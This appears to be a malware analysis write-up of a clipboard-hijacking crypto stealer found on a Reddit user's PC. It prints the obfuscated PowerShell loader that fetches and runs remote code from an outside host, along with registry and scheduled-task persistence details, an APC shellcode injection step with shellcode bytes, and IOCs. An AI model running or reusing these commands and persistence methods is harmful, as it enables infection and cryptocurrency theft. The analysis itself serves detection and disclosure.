Reddit : https://www.reddit.com/r/computerviruses/comments/1ruk5fs/my_pc_and_discord_account_were_hacked_can_someone/

Initial Command ran : (Revealed by FRST Scanner) : 

```
sal psv1 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe;
 .(gal ?rm) 45.10245905/load | .('ROGieROGx'.Replace('ROG', ''))}"
```

Resolve to : 
```irm 45.10245905/load | iex ```


Inside the fetched .ps1 the only interesting part is : 

```
function authPracticeNova {    
    $z = [System.Text.Encoding]::UTF8.GetString($useByteArray)
    $enc = [System.Text.Encoding]::UTF8
    $string = $enc.GetString([System.Convert]::FromBase64String($z))
    $byteString = $enc.GetBytes($string)
    $xorkey = $enc.GetBytes("$setxorKey")
    $xordData = New-Object byte[] $byteString.Length
    for ($i = 0; $i -lt $byteString.Length; $i++) {
        $xordData[$i] = $byteString[$i] -bxor $xorkey[$i % $xorkey.Length]
    }
    $xordData = $enc.GetString($xordData)
    return $xordData
}
```

the rest is noise to make our work slower , fetch 'setxorKey' & 'useByteArray'  and you get the next stage : stage2.ps1 

that will set a basic persistance mechanism :

Persistence Mechanisms
1. Registry Run Key
HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
Value: "Windows PowerShell v1.0"
Data: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "irm 45.10245905/load | iex"

- Executes on every user logon
- Written via a separate STA runspace specifically to avoid PSReadLine history logging


2. Scheduled Task — Event Triggered (Windows Perflog)
Name:     \Windows Perflog
Trigger:  Most frequent Application event ID (dynamic, last 500 events)
Action:   conhost.exe --headless powershell.exe ... irm 45.10245905/load | iex
Hidden:   true
- Clever — it dynamically picks the most common event ID from the Application log, ensuring near-constant re-triggering without a fixed timer
- Registered via COM (Schedule.Service) with RunLevel 3 (highest available without UAC)

3. Scheduled Task — Google Updater Masquerade (XML/schtasks)
Name:     \GoogleSystem\GoogleUpdater\GoogleUpdaterTaskSystem47.0.7703.3{47263A17-2D66-43B9-9692-30514D0C1AEC}
Trigger1: RegistrationTrigger — runs every 10 minutes immediately on creation
Trigger2: LogonTrigger — runs 30 minutes after user logon
Action:   conhost.exe --headless powershell.exe ... irm 45.10245905/load | iex
Hidden:   true
WakeToRun: true
RestartOnFailure: every 5 min, up to 3 times

- Masquerades as a legitimate Google Chrome updater task with a convincing GUID
- Written to %TEMP%\schevnt.xml then registered via schtasks /create, XML deleted after
- WakeToRun: true means it can wake the machine from sleep



Then we get to the actual fun : 

```
$psX64 = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$commandToRun = ".(gal ?rm) 45.10245905/reload | .('ROGieROGx'.Replace('ROG', ''))"
& "$psX64" -NoProfile -Command $commandToRun
```

Same method as the first one: 
```function authPracticeNova```

This time we get some shellcode injection using APC Injection in either 
``` EoAExperiences , snmptrap OR SppExtComObj```


the actual shellcode inject is defined as : 
```
# ======================================================================================
# Getting encoded license data
# ======================================================================================
$GelioSystem = @"
"\xe8\xcf\xd4\x01\x00\x00\x90\x03\x00\x46\xd4\x01\x00\xab\x33"
"\xd7\x1a\xd1\x29\x6c\xcd\x25\x6f\x1e\x61\x70\x28\xb6\x17\x5c"
"\x2d\xaf\xb2\xc6\xa0\x4c\x78\x03\x04\xff\xde\x1f\xbb\x6b\x94"
"\x7b\x5b\x36\x64\x02\xef\xdd\xed\x7a\x39\x56\x1c\x8c\x68\x81"
"\xcd\x63\xd1\xc7\xdb\xc1\xc4\x44\x6d\x51\x44\x1f\x4b\x06\xe8"
```


Virustotal of the shellcode : 
https://www.virustotal.com/gui/file/272718f24fe4bc2ab113162c0224d5e38f69f907d245debfca55419c1148b3f9 


Open the .bin into your favorite dissasembler and break near the end to dump the decoded malware : 

<img width="693" height="350" alt="image" src="https://github.com/user-attachments/assets/e6bcb9e4-fe79-4f7b-83e5-0b71c3c0da29" />


The call rsi on the left , 

BP on it and when it's hit look at your register tab : 

<img width="693" height="350" alt="image" src="https://github.com/user-attachments/assets/7451912d-bed1-433b-b8ea-64d27f8e7c50" />

With got the whole exe right there in memory for us to dump :)



From there , a few functions 
like this dissasembly : 
user32_clipboard_OPEN 

and some crypto related detection let us conclude this malware goal is to pull & replace any crypto you may copy for theirs let test it : 

The first address i copy from from the SILK road FBI seized one : 

<img width="369" height="60" alt="image" src="https://github.com/user-attachments/assets/f3c02049-1f19-47b1-8e34-c5cf730be2ec" />


Copy paste it and suddently 

```
1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
```
Become : 

```
1FJb6AWhaMzihdK8py3czzETb3cdBQ7aPH
```

there's a use case for almost every wallet possible 


In term of IOC / extraction point : 

```
172.67.199.199
104.18.21.213

```




07.7z Contain the Shellcode + Shellcode with a STUB. 

password 'infected' .
